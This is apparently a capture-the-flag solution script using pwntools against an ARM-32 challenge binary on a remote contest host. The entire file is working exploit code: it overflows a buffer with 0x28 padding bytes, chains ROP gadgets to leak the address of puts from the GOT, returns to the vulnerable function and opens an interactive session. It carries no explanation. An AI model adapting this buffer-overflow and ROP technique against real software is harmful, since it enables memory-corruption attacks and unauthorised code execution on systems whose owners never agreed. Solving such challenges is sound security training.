from pwn import *

# arm-32-little
conn = remote('chal.nbctf.com', 30175)
context.log_level = 'debug'

pop_r3_pc = 0x00010388
mov_r0_r3_pop_fp_pc = 0x00010550

puts_got = 0x11fe8
puts_plt = 0x13008
vuln_addr = 0x104e0

rop1 = p32(pop_r3_pc) + p32(puts_got) + p32(mov_r0_r3_pop_fp_pc) + p32(0) + p32(puts_plt) + p32(vuln_addr)
conn.sendline(b'A'*0x28 + rop1)


conn.interactive()